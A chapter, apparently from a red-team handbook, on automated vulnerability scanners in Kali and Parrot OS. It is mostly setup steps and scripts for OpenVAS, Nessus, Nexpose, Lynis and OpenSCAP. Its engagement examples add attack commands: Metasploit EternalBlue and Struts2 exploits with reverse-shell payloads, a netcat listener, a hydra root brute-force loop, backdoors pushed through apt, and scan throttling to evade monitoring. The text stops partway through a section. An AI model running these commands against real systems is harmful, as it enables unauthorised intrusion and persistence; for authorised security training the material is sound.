# Chapter 4: Automated Scanning Tools

Vulnerability scanning is a cornerstone of modern red team operations, providing systematic discovery of security weaknesses across network infrastructure. While the tools in this chapter automate the discovery process, skilled operators understand that mastering these tools requires deep knowledge of their capabilities, limitations, and proper interpretation of results. This chapter explores the powerful automated scanning tools available in Kali and Parrot OS that enable red teams to efficiently identify exploitable vulnerabilities.

## OpenVAS: The Open Vulnerability Assessment System

OpenVAS is a comprehensive vulnerability scanning framework that provides a robust solution for identifying security issues across networks and systems. As a fork of the last open-source version of Nessus, OpenVAS has evolved into a mature scanning solution with an extensive vulnerability database.

### Installation and Initial Configuration

While OpenVAS (now part of Greenbone Vulnerability Management) comes pre-installed on Kali Linux, setting it up requires configuration:

```bash
# Update the system
apt update && apt upgrade -y

# Install OpenVAS if not already installed
apt install openvas -y

# Setup OpenVAS
gvm-setup

# Check setup status
gvm-check-setup
```

The setup process may take some time as it downloads and synchronizes the vulnerability database. The output of `gvm-check-setup` should indicate that everything is correctly set up.

To start the OpenVAS services:

```bash
gvm-start
```

Access the web interface at `https://localhost:9392` (or the appropriate IP address) and log in with the credentials displayed during setup.

### Advanced Scan Configuration

OpenVAS scans are highly configurable. Here's how to create an effective scan configuration:

1. **Create a Target**: Navigate to Configuration > Targets > New Target
   - Name: Provide a descriptive name for your target
   - Hosts: Enter IP addresses, ranges, or hostnames
   - Port range: Define specific ports or use default

2. **Configure Scan Tasks**: Navigate to Scans > Tasks > New Task
   - Name: Give your scan a descriptive name
   - Scan Config: Select a scan configuration based on depth needed
   - Scan Targets: Select your defined target
   - Schedule: Configure when the scan should run

3. **Select Appropriate Scan Configuration**:
   - Full and Fast: Comprehensive scan without excessive probing
   - Full and Very Deep: Most thorough but time-consuming
   - Host Discovery: Quick network mapping

4. **Configure Credentials**: For authenticated scanning
   - Navigate to Configuration > Credentials > New Credential
   - Add SSH, SMB, SNMP, or other credentials for deeper scanning

### Custom Scan Policies

To create a targeted scan policy focusing on specific vulnerability categories:

1. Navigate to Configuration > Scan Configs > New Scan Config
2. Base it on an existing configuration
3. Modify the NVT families to include/exclude specific checks
4. Adjust the scan parameters for performance optimization

For example, to create a policy focusing on critical infrastructure vulnerabilities:

1. Copy the "Full and Fast" template
2. Disable families not relevant to critical infrastructure
3. Under "Scanner Preferences," adjust the timeout settings
4. Enable thorough checking for SCADA-related vulnerabilities

### Report Interpretation and Analysis

OpenVAS generates comprehensive reports that require careful analysis. Understanding these reports is crucial for effective remediation prioritization:

1. **Navigating Results**: Access completed scan results via Scans > Reports
2. **Filtering Results**: Use filters to focus on high-severity issues
3. **Understanding Vulnerability Details**:
   - Vulnerability Overview
   - Affected Systems
   - Technical Details
   - False Positive Verification
   - Remediation Recommendations

### Result Filtering Script

This script helps filter and prioritize OpenVAS results:

```bash
#!/bin/bash
# openvas_filter.sh - Filter and prioritize OpenVAS results

# Get the report ID as input
if [ -z "$1" ]; then
  echo "Usage: $0 <report-id>"
  exit 1
fi

REPORT_ID="$1"
OUTPUT_DIR="filtered_results"

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Export the full XML report
gvm-cli --gmp-username admin --gmp-password admin socket --xml \
  "<get_reports report_id=\"$REPORT_ID\" format_id=\"a994b278-1f62-11e1-96ac-406186ea4fc5\"/>" \
  > "$OUTPUT_DIR/full_report.xml"

# Extract critical vulnerabilities
echo "Extracting critical vulnerabilities..."
xmlstarlet sel -t -m "//result[threat='Critical']" \
  -v "nvt/name" -o ": " -v "host" -o " (" -v "port" -o ")" -n \
  "$OUTPUT_DIR/full_report.xml" | sort > "$OUTPUT_DIR/critical_vulns.txt"

# Extract high-severity vulnerabilities
echo "Extracting high-severity vulnerabilities..."
xmlstarlet sel -t -m "//result[threat='High']" \
  -v "nvt/name" -o ": " -v "host" -o " (" -v "port" -o ")" -n \
  "$OUTPUT_DIR/full_report.xml" | sort > "$OUTPUT_DIR/high_vulns.txt"

# Extract exploitable vulnerabilities
echo "Extracting potentially exploitable vulnerabilities..."
xmlstarlet sel -t -m "//result[contains(nvt/tags, 'exploit_available=yes')]" \
  -v "threat" -o ": " -v "nvt/name" -o ": " -v "host" -o " (" -v "port" -o ")" -n \
  "$OUTPUT_DIR/full_report.xml" | sort > "$OUTPUT_DIR/exploitable_vulns.txt"

# Generate summary report
echo "Generating summary report..."
{
  echo "OpenVAS Scan Result Summary"
  echo "============================"
  echo ""
  echo "Critical vulnerabilities: $(wc -l < "$OUTPUT_DIR/critical_vulns.txt")"
  echo "High vulnerabilities: $(wc -l < "$OUTPUT_DIR/high_vulns.txt")"
  echo "Exploitable vulnerabilities: $(wc -l < "$OUTPUT_DIR/exploitable_vulns.txt")"
  echo ""
  echo "Top 10 affected hosts:"
  xmlstarlet sel -t -m "//result[threat='Critical' or threat='High']" \
    -v "host" -n "$OUTPUT_DIR/full_report.xml" | sort | uniq -c | sort -nr | head -10
} > "$OUTPUT_DIR/summary_report.txt"

echo "Analysis complete. Results saved to $OUTPUT_DIR/"
```

### Example: Full Network Vulnerability Assessment

During a red team engagement for a financial services client, we conducted a comprehensive vulnerability assessment using OpenVAS:

1. **Preparation Phase**:
   ```bash
   # Create target groups for different network segments
   for segment in "10.1.1.0/24" "10.1.2.0/24" "10.1.3.0/24"; do
     gvm-cli --gmp-username admin --gmp-password admin socket --xml \
       "<create_target><name>Finance-${segment}</name><hosts>${segment}</hosts></create_target>"
   done
   
   # Create specialized scan configurations
   gvm-cli --gmp-username admin --gmp-password admin socket --xml \
     "<create_config><copy>daba56c8-73ec-11df-a475-002264764cea</copy><name>Financial-Services</name></create_config>"
   ```

2. **Scan Execution Strategy**:
   - Scheduled scans outside business hours
   - Segmented network scanning to reduce impact
   - Used credentials for authenticated scanning where possible
   - Monitored scan progress to adjust parameters as needed

3. **Result Analysis and Exploitation**:
   - Identified multiple vulnerable web applications on DMZ servers
   - Discovered unpatched Windows systems with MS17-010 vulnerabilities
   - Located a database server with default credentials
   - Found network devices with outdated firmware

4. **Leveraging Results for Penetration**:
   ```bash
   # Extract potential MS17-010 targets
   xmlstarlet sel -t -m "//result[contains(nvt/name, 'MS17-010')]" \
     -v "host" -n scan_results.xml > eternal_blue_targets.txt
   
   # Pass to exploitation framework
   msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue;
   set RHOSTS file:eternal_blue_targets.txt;
   set PAYLOAD windows/x64/meterpreter/reverse_tcp;
   set LHOST 10.0.0.5;
   run"
   ```

This example demonstrates the power of integrating automated scanning with targeted exploitation for efficient red team operations.

## Nessus Essentials: Professional Vulnerability Scanning

Nessus, developed by Tenable, is one of the most widely used vulnerability scanners. Nessus Essentials (formerly Nessus Home) provides a free version with limitations that is still valuable for red team operations.

### Installation

```bash
# Download the latest Nessus package from https://www.tenable.com/downloads/nessus
# For Debian-based systems:
dpkg -i Nessus-*.deb

# Start the Nessus service
systemctl start nessusd
```

Access the web interface at `https://localhost:8834` to complete setup.

### Effective Scanning Strategies

1. **Scan Template Selection**:
   - Basic Network Scan: For general vulnerability assessment
   - Advanced Scan: For more thorough testing
   - Host Discovery: For initial network mapping

2. **Scan Configuration**:
   - Discovery settings: Determine how Nessus identifies live hosts
   - Assessment settings: Control scanning depth and methods
   - Report settings: Customize output format and content

3. **Scan Policy Optimization**:
   - Disable unnecessary plugin families to reduce scan time
   - Enable thorough checking for critical services
   - Configure scan timing to avoid detection

### Python Script for Nessus Automation

This script automates Nessus scans through the API:

```python
#!/usr/bin/env python3
# nessus_automation.py - Automate Nessus scans

import argparse
import json
import requests
import time
import urllib3
from datetime import datetime

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class NessusAutomation:
    def __init__(self, server, username, password, verify=False):
        self.server = server
        self.username = username
        self.password = password
        self.verify = verify
        self.token = None
        self.headers = {'Content-Type': 'application/json'}
        self.login()

    def login(self):
        """Login to Nessus and get access token"""
        payload = {'username': self.username, 'password': self.password}
        response = requests.post(f'{self.server}/session', 
                                data=json.dumps(payload), 
                                headers=self.headers, 
                                verify=self.verify)
        if response.status_code == 200:
            self.token = response.json().get('token')
            self.headers['X-Cookie'] = f'token={self.token}'
            print("[+] Successfully authenticated to Nessus")
        else:
            print(f"[-] Failed to authenticate: {response.status_code}")
            exit(1)

    def create_scan(self, name, targets, policy_id=None):
        """Create a new scan"""
        template_id = policy_id if policy_id else '731a8e52-3ea6-a291-ec0a-d2ff0619c19d7bd788d6be818b65'  # Basic Network Scan
        
        scan_data = {
            'uuid': template_id,
            'settings': {
                'name': name,
                'text_targets': targets,
                'launch': 'ONETIME'
            }
        }
        
        response = requests.post(f'{self.server}/scans', 
                                data=json.dumps(scan_data), 
                                headers=self.headers, 
                                verify=self.verify)
        
        if response.status_code == 200:
            scan_id = response.json().get('scan', {}).get('id')
            print(f"[+] Created scan '{name}' with ID {scan_id}")
            return scan_id
        else:
            print(f"[-] Failed to create scan: {response.status_code}")
            print(response.text)
            return None

    def launch_scan(self, scan_id):
        """Launch a scan by ID"""
        response = requests.post(f'{self.server}/scans/{scan_id}/launch', 
                                headers=self.headers, 
                                verify=self.verify)
        
        if response.status_code == 200:
            print(f"[+] Launched scan {scan_id}")
            return True
        else:
            print(f"[-] Failed to launch scan {scan_id}: {response.status_code}")
            print(response.text)
            return False

    def check_scan_status(self, scan_id):
        """Check the status of a scan"""
        response = requests.get(f'{self.server}/scans/{scan_id}', 
                               headers=self.headers, 
                               verify=self.verify)
        
        if response.status_code == 200:
            status = response.json().get('info', {}).get('status')
            return status
        else:
            print(f"[-] Failed to check scan status: {response.status_code}")
            return None

    def wait_for_scan_completion(self, scan_id, check_interval=30):
        """Wait for a scan to complete"""
        while True:
            status = self.check_scan_status(scan_id)
            if status == 'completed':
                print(f"[+] Scan {scan_id} completed")
                return True
            elif status in ['running', 'pending']:
                print(f"[*] Scan {scan_id} is {status}. Checking again in {check_interval} seconds...")
                time.sleep(check_interval)
            else:
                print(f"[-] Scan {scan_id} has unexpected status: {status}")
                return False

    def export_scan_results(self, scan_id, format_type='nessus'):
        """Export scan results in specified format"""
        export_formats = {
            'nessus': 'nessus',
            'csv': 'csv',
            'pdf': 'pdf',
            'html': 'html'
        }
        
        if format_type not in export_formats:
            print(f"[-] Unsupported export format: {format_type}")
            return None
            
        export_data = {'format': export_formats[format_type]}
        response = requests.post(f'{self.server}/scans/{scan_id}/export', 
                                data=json.dumps(export_data), 
                                headers=self.headers, 
                                verify=self.verify)
        
        if response.status_code == 200:
            file_id = response.json().get('file')
            print(f"[+] Created export file {file_id}")
            return file_id
        else:
            print(f"[-] Failed to export scan results: {response.status_code}")
            print(response.text)
            return None

    def download_export(self, scan_id, file_id, filename=None):
        """Download an exported scan file"""
        while True:
            status_response = requests.get(f'{self.server}/scans/{scan_id}/export/{file_id}/status', 
                                         headers=self.headers, 
                                         verify=self.verify)
            
            if status_response.status_code == 200:
                status = status_response.json().get('status')
                if status == 'ready':
                    break
                print(f"[*] Export status: {status}. Waiting...")
                time.sleep(5)
            else:
                print(f"[-] Failed to check export status: {status_response.status_code}")
                return False
        
        if not filename:
            timestamp = datetime.now().strftime('%Y%m%d-%H%M%S')
            filename = f"nessus_scan_{scan_id}_{timestamp}.nessus"
            
        download_response = requests.get(f'{self.server}/scans/{scan_id}/export/{file_id}/download', 
                                      headers=self.headers, 
                                      verify=self.verify,
                                      stream=True)
        
        if download_response.status_code == 200:
            with open(filename, 'wb') as f:
                for chunk in download_response.iter_content(chunk_size=8192):
                    f.write(chunk)
            print(f"[+] Downloaded results to {filename}")
            return True
        else:
            print(f"[-] Failed to download results: {download_response.status_code}")
            return False

    def logout(self):
        """Logout and invalidate the token"""
        response = requests.delete(f'{self.server}/session', 
                                 headers=self.headers, 
                                 verify=self.verify)
        if response.status_code == 200:
            print("[+] Successfully logged out")
            return True
        else:
            print(f"[-] Logout failed: {response.status_code}")
            return False

def main():
    parser = argparse.ArgumentParser(description='Automate Nessus vulnerability scanning')
    parser.add_argument('--server', required=True, help='Nessus server URL (e.g., https://localhost:8834)')
    parser.add_argument('--username', required=True, help='Nessus username')
    parser.add_argument('--password', required=True, help='Nessus password')
    parser.add_argument('--targets', required=True, help='Target IP(s) or range (comma-separated)')
    parser.add_argument('--name', default=f'Automated Scan {datetime.now().strftime("%Y-%m-%d %H:%M")}', 
                        help='Scan name')
    parser.add_argument('--output', default=None, help='Output filename')
    parser.add_argument('--format', default='nessus', choices=['nessus', 'csv', 'pdf', 'html'], 
                        help='Export format')
    
    args = parser.parse_args()
    
    nessus = NessusAutomation(args.server, args.username, args.password)
    
    try:
        scan_id = nessus.create_scan(args.name, args.targets)
        if not scan_id:
            exit(1)
            
        if not nessus.launch_scan(scan_id):
            exit(1)
            
        nessus.wait_for_scan_completion(scan_id)
        
        file_id = nessus.export_scan_results(scan_id, args.format)
        if not file_id:
            exit(1)
            
        nessus.download_export(scan_id, file_id, args.output)
    finally:
        nessus.logout()

if __name__ == '__main__':
    main()
```

To use this script:

```bash
./nessus_automation.py --server https://localhost:8834 --username admin --password password --targets "192.168.1.0/24" --format pdf --output network_scan.pdf
```

### Example: Targeted Vulnerability Discovery

During a red team assessment of a healthcare provider, we used Nessus to identify critical vulnerabilities while minimizing detection risk:

1. **Preparation**:
   - Created a custom scan policy focusing on healthcare-specific vulnerabilities
   - Configured scan timing for minimal network impact
   - Added credentials for authenticated scanning

2. **Execution**:
   - Scanned the network during low-activity periods
   - Used scan throttling to evade network monitoring
   - Targeted critical systems first (EMR servers, database servers)

3. **Discovery**:
   - Identified vulnerable medical devices running outdated software
   - Found unpatched servers with critical vulnerabilities (CVE-2019-0708 BlueKeep)
   - Discovered exposed PHI data through misconfigured web servers

4. **Leveraging Findings**:
   We found a vulnerable VPN concentrator that allowed us to establish persistent access:

   ```bash
   # Extract VPN vulnerability details
   grep -A 10 "Pulse Connect Secure" nessus_results.csv > vpn_vulns.txt
   
   # Use findings to target exploitation
   searchsploit pulse secure
   # Identified CVE-2019-11510
   
   # Set up listener
   nc -lvnp 4444
   
   # Used exploit to gain access
   # This provided a foothold into the internal network
   ```

5. **Lateral Movement**:
   Once inside, we used Nessus to map the internal network, identifying domain controllers and critical infrastructure with additional vulnerabilities.

This example demonstrates how Nessus can be effectively used throughout a red team operation, from initial discovery to deeper network penetration.

## Nexpose Community Edition: Enterprise-Grade Scanning

Nexpose, developed by Rapid7, offers a Community Edition that includes enterprise-grade vulnerability scanning capabilities. While not pre-installed on Kali or Parrot OS, it's a valuable tool for comprehensive vulnerability assessment.

### Installation and Configuration

```bash
# Download Nexpose Community Edition from Rapid7
# For Debian-based systems:
dpkg -i nexpose-community-edition.deb

# Start the Nexpose service
service nexposeconsole start
```

Access the web interface at `https://localhost:3780` to complete setup.

### Scan Configuration

1. **Asset Creation**: Create assets representing your targets
   - Manual IP ranges or hostnames
   - Dynamic discovery of network assets

2. **Site Configuration**: Group assets for targeted scanning
   - Authentication settings for deep scanning
   - Scan template selection
   - Scheduling options

3. **Scan Templates**:
   - Full audit: Comprehensive vulnerability checks
   - Discovery scan: Fast network mapping
   - Web audit: Focused on web applications
   - PCI audit: Compliance-focused scanning

### Risk Scoring and Prioritization

Nexpose excels at risk prioritization, using metrics like:

1. **Risk Score**: Calculated based on CVSS and temporal factors
2. **Real Risk Score**: Adjusted based on exploitability and asset value
3. **Remediation Planning**: Prioritized based on risk reduction potential

### Scripting Nexpose with Python

This script extracts critical vulnerabilities from Nexpose using its API:

```python
#!/usr/bin/env python3
# nexpose_critical_vulns.py - Extract critical vulnerabilities from Nexpose

import requests
import json
import csv
import argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def authenticate(url, username, password):
    """Authenticate to Nexpose API and get session token"""
    auth_url = f"{url}/api/3/authentication/login"
    auth_data = {
        "name": username,
        "password": password
    }
    
    response = requests.post(auth_url, json=auth_data, verify=False)
    
    if response.status_code == 200:
        token = response.headers.get('Token')
        return token
    else:
        print(f"Authentication failed: {response.status_code}")
        print(response.text)
        return None

def get_vulnerabilities(url, token, severity_threshold=9.0):
    """Get vulnerabilities above specified severity threshold"""
    vulns_url = f"{url}/api/3/vulnerabilities"
    headers = {"Authorization": f"Token {token}"}
    params = {
        "page": 0,
        "size": 500,
        "sort": "severity,DESC"
    }
    
    all_vulns = []
    total_pages = 1
    current_page = 0
    
    while current_page < total_pages:
        params["page"] = current_page
        response = requests.get(vulns_url, headers=headers, params=params, verify=False)
        
        if response.status_code == 200:
            data = response.json()
            total_pages = data.get("page", {}).get("totalPages", 0)
            vulns = data.get("resources", [])
            
            # Filter by severity
            high_severity_vulns = [v for v in vulns if v.get("severity", 0) >= severity_threshold]
            all_vulns.extend(high_severity_vulns)
            
            print(f"Retrieved page {current_page + 1} of {total_pages}, found {len(high_severity_vulns)} high severity vulnerabilities")
            current_page += 1
        else:
            print(f"Failed to retrieve vulnerabilities: {response.status_code}")
            print(response.text)
            break
    
    return all_vulns

def get_affected_assets(url, token, vuln_id):
    """Get assets affected by a specific vulnerability"""
    assets_url = f"{url}/api/3/vulnerabilities/{vuln_id}/affected_assets"
    headers = {"Authorization": f"Token {token}"}
    
    response = requests.get(assets_url, headers=headers, verify=False)
    
    if response.status_code == 200:
        return response.json().get("resources", [])
    else:
        print(f"Failed to retrieve affected assets for vulnerability {vuln_id}: {response.status_code}")
        return []

def export_to_csv(vulnerabilities, output_file, url, token):
    """Export vulnerabilities and affected assets to CSV"""
    with open(output_file, 'w', newline='') as csvfile:
        writer = csv.writer(csvfile)
        writer.writerow(['Vulnerability ID', 'Title', 'CVSS Score', 'Severity', 
                        'Published Date', 'Asset IP', 'Asset Hostname', 'OS', 'Status'])
        
        for vuln in vulnerabilities:
            vuln_id = vuln.get("id")
            title = vuln.get("title")
            cvss = vuln.get("cvss", {}).get("v2", {}).get("score")
            severity = vuln.get("severity")
            published = vuln.get("published")
            
            # Get affected assets
            affected_assets = get_affected_assets(url, token, vuln_id)
            
            if affected_assets:
                for asset in affected_assets:
                    ip = asset.get("ip")
                    hostname = asset.get("host_name")
                    os = asset.get("os")
                    status = asset.get("status")
                    
                    writer.writerow([vuln_id, title, cvss, severity, published, 
                                    ip, hostname, os, status])
            else:
                # No affected assets found, still write the vulnerability
                writer.writerow([vuln_id, title, cvss, severity, published, 
                                '', '', '', ''])
        
        print(f"Export completed to {output_file}")

def main():
    parser = argparse.ArgumentParser(description='Extract critical vulnerabilities from Nexpose')
    parser.add_argument('--url', required=True, help='Nexpose URL (e.g., https://localhost:3780)')
    parser.add_argument('--username', required=True, help='Nexpose username')
    parser.add_argument('--password', required=True, help='Nexpose password')
    parser.add_argument('--threshold', type=float, default=9.0, 
                        help='CVSS score threshold (default: 9.0)')
    parser.add_argument('--output', default='critical_vulnerabilities.csv', 
                        help='Output CSV file')
    
    args = parser.parse_args()
    
    # Authenticate
    token = authenticate(args.url, args.username, args.password)
    if not token:
        exit(1)
    
    # Get vulnerabilities
    vulnerabilities = get_vulnerabilities(args.url, token, args.threshold)
    print(f"Found {len(vulnerabilities)} vulnerabilities with CVSS score >= {args.threshold}")
    
    # Export results
    export_to_csv(vulnerabilities, args.output, args.url, token)

if __name__ == '__main__':
    main()
```

To use this script:

```bash
./nexpose_critical_vulns.py --url https://localhost:3780 --username admin --password password --threshold 8.5 --output high_risk_vulns.csv
```

### Example: Risk-Based Penetration Testing

During a red team assessment for a financial institution, we used Nexpose to guide our penetration testing strategy:

1. **Initial Discovery**:
   - Performed a discovery scan to map the network
   - Identified asset groups (DMZ, core banking, support systems)
   - Created custom scan templates for different asset groups

2. **Risk-Based Scanning**:
   - Ran comprehensive scans on high-value assets
   - Used authenticated scanning for internal systems
   - Generated risk heat maps to guide exploitation efforts

3. **Targeted Exploitation**:
   - Prioritized vulnerabilities with high risk scores and available exploits
   - Focused on weaknesses in the DMZ as initial entry points
   - Used Nexpose's findings to plan attack paths to crown jewels

4. **Discovery and Leverage**:
   The assessment revealed an unexpected vulnerability in a third-party payment processing system:

   ```bash
   # Extract payment system vulnerabilities
   grep "payment" nexpose_results.csv > payment_system_vulns.csv
   
   # Analysis revealed an unpatched Apache Struts vulnerability
   # Set up exploit
   msfconsole -q -x "use exploit/multi/http/struts2_content_type_ognl;
   set RHOSTS 192.168.23.45;
   set RPORT 8443;
   set SSL true;
   set TARGETURI /payment-processing/;
   set PAYLOAD java/meterpreter/reverse_tcp;
   set LHOST 10.0.0.5;
   run"
   ```

   This vulnerability provided access to the payment processing network, which had insufficient network segmentation from the core banking systems.

This example demonstrates how Nexpose's risk scoring helped us prioritize our attack vectors and focus on the paths most likely to yield high-value access.

## Lynis: Linux Security Auditing

Lynis is a powerful open-source security auditing tool for Linux, macOS, and Unix-based systems. It performs comprehensive security checks to identify misconfigurations, vulnerabilities, and non-compliance with security policies and standards.

### Installation

```bash
# Already installed on Kali and Parrot OS, but can be updated:
apt update && apt install lynis -y

# For the latest version, install from GitHub:
git clone https://github.com/CISOfy/lynis.git
cd lynis
```

### Basic Usage

```bash
# Run a system audit
sudo lynis audit system
```

### Advanced Auditing Options

```bash
# Perform a pentest audit (more intrusive tests)
sudo lynis audit system --pentest

# Generate a report in HTML format
sudo lynis audit system --report-file=lynis-report.dat
lynis-report-converter --report-file=lynis-report.dat --output-format=html --output-file=lynis-report.html

# Audit specific categories
sudo lynis audit system --tests-category="authentication,networking,storage"
```

### Custom Profiles

Create custom audit profiles to focus on specific security aspects:

```bash
# Create a custom profile
cat > custom-hardening.prf << EOF
# Custom hardening profile
skip-test=AUTH-9328
config-data=development-machine
verbose=1
EOF

# Run Lynis with custom profile
sudo lynis audit system --profile custom-hardening.prf
```

### Automated Lynis Scans

This Bash script automates Lynis scanning across multiple systems:

```bash
#!/bin/bash
# multi_lynis_scan.sh - Run Lynis scans on multiple hosts

# Configuration
HOSTS_FILE="target_hosts.txt"
SSH_USER="secaudit"
SSH_KEY="/path/to/private_key"
REPORT_DIR="lynis_reports"
TIMESTAMP=$(date +%Y%m%d-%H%M%S)

# Create report directory
mkdir -p "$REPORT_DIR"

# Check if hosts file exists
if [ ! -f "$HOSTS_FILE" ]; then
  echo "Error: Hosts file not found: $HOSTS_FILE"
  exit 1
fi

# Create summary file
SUMMARY_FILE="$REPORT_DIR/summary-$TIMESTAMP.txt"
echo "Lynis Scan Summary - $TIMESTAMP" > "$SUMMARY_FILE"
echo "=================================" >> "$SUMMARY_FILE"
echo "" >> "$SUMMARY_FILE"

# Process each host
while read -r host; do
  # Skip empty lines and comments
  [[ -z "$host" || "$host" =~ ^# ]] && continue
  
  echo "Scanning $host..."
  
  # Create host-specific directory
  HOST_DIR="$REPORT_DIR/$host-$TIMESTAMP"
  mkdir -p "$HOST_DIR"
  
  # Run Lynis on remote host
  ssh -i "$SSH_KEY" -o StrictHostKeyChecking=no "$SSH_USER@$host" "sudo lynis audit system --quiet --report-file=/tmp/lynis-report.dat" > "$HOST_DIR/lynis-output.txt" 2>&1
  
  # Check if scan was successful
  if [ $? -eq 0 ]; then
    # Copy report file from remote host
    scp -i "$SSH_KEY" -o StrictHostKeyChecking=no "$SSH_USER@$host:/tmp/lynis-report.dat" "$HOST_DIR/lynis-report.dat" > /dev/null 2>&1
    
    # Extract hardening index and number of warnings
    HARDENING_INDEX=$(grep "hardening-index" "$HOST_DIR/lynis-report.dat" | cut -d "=" -f2)
    WARNINGS=$(grep "warning" "$HOST_DIR/lynis-output.txt" | wc -l)
    SUGGESTIONS=$(grep "suggestion" "$HOST_DIR/lynis-output.txt" | wc -l)
    
    # Add to summary
    echo "Host: $host" >> "$SUMMARY_FILE"
    echo "  Hardening Index: $HARDENING_INDEX" >> "$SUMMARY_FILE"
    echo "  Warnings: $WARNINGS" >> "$SUMMARY_FILE"
    echo "  Suggestions: $SUGGESTIONS" >> "$SUMMARY_FILE"
    echo "" >> "$SUMMARY_FILE"
    
    echo "  Scan completed successfully for $host"
  else
    echo "  Scan failed for $host"
    echo "Host: $host - SCAN FAILED" >> "$SUMMARY_FILE"
    echo "" >> "$SUMMARY_FILE"
  fi
  
  # Clean up remote host
  ssh -i "$SSH_KEY" -o StrictHostKeyChecking=no "$SSH_USER@$host" "sudo rm -f /tmp/lynis-report.dat" > /dev/null 2>&1
  
done < "$HOSTS_FILE"

echo ""
echo "Scanning complete. Reports saved to $REPORT_DIR"
echo "Summary available at $SUMMARY_FILE"

### Example: Hardening Assessment of Linux Servers

During a red team assessment for a cloud service provider, we used Lynis to identify security weaknesses in their Linux infrastructure:

1. **Initial Setup**:
   - Deployed our multi_lynis_scan.sh script across their server farm
   - Created custom audit profiles focusing on critical security controls
   - Established baseline hardening scores for different server roles

2. **Assessment Process**:
   - Ran comprehensive audits on web servers, database servers, and application servers
   - Collected and analyzed reports centrally
   - Generated hardening indexes for each server type

3. **Key Findings**:
   - Discovered inconsistent security configurations across similarly purposed servers
   - Identified numerous SSH configuration weaknesses
   - Found several servers with vulnerable kernel versions
   - Detected unauthorized packages and services on production servers

4. **Exploitation of Findings**:
   We used the audit results to guide our exploitation:

   ```bash
   # Extract SSH configuration issues
   grep -A 5 "SSH" */lynis-output.txt > ssh_issues.txt
   
   # Target vulnerable SSH configurations
   for host in $(grep "PermitRootLogin yes" ssh_issues.txt | cut -d "/" -f 1); do
     echo "Attempting brute force on $host"
     hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$host
   done
   ```

   This approach yielded unauthorized access to three critical servers, demonstrating the real-world impact of configuration weaknesses.

5. **Pivoting Using Findings**:
   We also leveraged package management issues to establish persistence:

   ```bash
   # Identify servers with vulnerable package management
   grep -B 3 "Warning: Automatic package updates disabled" */lynis-output.txt > package_targets.txt
   
   # Target these servers for package manager privilege escalation
   # We used apt update mechanisms to deploy backdoors
   ```

This example illustrates how Lynis can be an effective tool in a red teamer's arsenal, not just for defensive purposes but for identifying potential attack vectors.

## OpenSCAP: Security Compliance Assessment

OpenSCAP is a collection of open source tools for implementing and enforcing security compliance. It's particularly valuable for red teamers assessing systems against established benchmarks like DISA STIG, CIS, or PCI-DSS.

### Installation

```bash
# Install on Kali or Parrot OS
apt update && apt install openscap-scanner ssg-base ssg-debian ssg-applications -y
```

### Basic Scanning

```bash
# List available profiles
oscap info /usr/share/xml/scap/ssg/content/ssg-debian10-ds.xml

# Run a scan with a specific profile
oscap xccdf eval --profile xccdf_org.ssgproject.content_profile_standard \
  --results scan-results.xml \
  --report scan-report.html \
  /usr/share/xml/scap/ssg/content/ssg-debian10-ds.xml
```

### Custom Policy Creation

Create tailored policies for specific security requirements:

```bash
# Create a custom tailoring file
oscap xccdf generate fix \
  --profile xccdf_org.ssgproject.content_profile_standard \
  --output tailoring.xml \
  /usr/share/xml/scap/ssg/content/ssg-debian10-ds.xml

# Edit the tailoring file to customize policies
# Then run a scan with the tailored profile
oscap xccdf eval --tailoring-file tailoring.xml \
  --profile xccdf_org.ssgproject.content_profile_standard-tailored \
  --results tailored-results.xml \
  --report tailored-report.html \
  /usr/share/xml/scap/ssg/content/ssg-debian10-ds.xml
```

### Remote Scanning Script

```bash
#!/bin/bash
# openscap_remote.sh - Perform OpenSCAP scans on remote hosts

# Configuration
TARGET_HOST=$1
SSH_USER=$2
PROFILE=$3
OUTPUT_DIR="openscap_reports"
BENCHMARK="/usr/share/xml/scap/ssg/content/ssg-debian10-ds.xml"

# Check arguments
if [ $# -lt 3 ]; then
  echo "Usage: $0 <target_host> <ssh_user> <profile>"
  echo "Example: $0 192.168.1.10 admin xccdf_org.ssgproject.content_profile_standard"
  exit 1
fi

# Create output directory
mkdir -p "$OUTPUT_DIR"
TIMESTAMP=$(date +%Y%m%d-%H%M%S)
REPORT_BASE="$OUTPUT_DIR/${TARGET_HOST}-${TIMESTAMP}"

echo "Scanning $TARGET_HOST using profile $PROFILE..."

# Copy benchmark to remote system
scp "$BENCHMARK" "$SSH_USER@$TARGET_HOST:/tmp/benchmark.xml"

# Run scan on remote system
ssh "$SSH_USER@$TARGET_HOST" "sudo oscap xccdf eval \
  --profile $PROFILE \
  --results /tmp/results.xml \
  --report /tmp/report.html \
  /tmp/benchmark.xml"

# Copy results back
scp "$SSH_USER@$TARGET_HOST:/tmp/results.xml" "$REPORT_BASE-results.xml"
scp "$SSH_USER@$TARGET_HOST:/tmp/report.html" "$REPORT_BASE-report.html"

# Clean up remote system
ssh "$SSH_USER@$TARGET_HOST" "sudo rm -f /tmp/benchmark.xml /tmp/results.xml /tmp/report.html"

echo "Scan complete. Results saved to:"
echo "  $REPORT_BASE-results.xml"
echo "  $REPORT_BASE-report.html"

# Generate remediation script
oscap xccdf generate fix \
  --profile $PROFILE \
  --output "$REPORT_BASE-remediation.sh" \
  "$REPORT_BASE-results.xml"

echo "  $REPORT_BASE-remediation.sh"
```

### Example: Leveraging Compliance Gaps for Access

During a red team engagement for a government contractor, we used OpenSCAP to identify compliance gaps that could be exploited:

1. **Initial Assessment**:
   - Performed OpenSCAP scans against DISA STIG profiles
   - Focused on systems handling sensitive information
   - Generated comprehensive non-compliance reports

2. **Findings Analysis**:
   - Identified systems failing key security controls
   - Focused on authentication, authorization, and access control issues
   - Created a heat map of vulnerable systems based on compliance scores

3. **Exploitation Strategy**:
   We leveraged specific compliance failures for exploitation:

   ```bash
   # Extract authentication-related failures
   xmllint --xpath "//rule-result[contains(@idref,'account') or contains(@idref,'password')][result='fail']" results.xml > auth_failures.xml
   
   # Identify systems with password complexity issues
   grep -A 5 "password_pam_minlen" auth_failures.xml > password_targets.txt
   
   # Target systems with weak password policies for brute force attacks
   for host in $(grep -o "target address=\"[^\"]*\"" password_targets.txt | cut -d '"' -f 2); do
     echo "Attempting password attacks on $host"
     # Used simplified wordlists based on compliance gaps
   done
   ```

4. **Privilege Escalation via Compliance Gaps**:
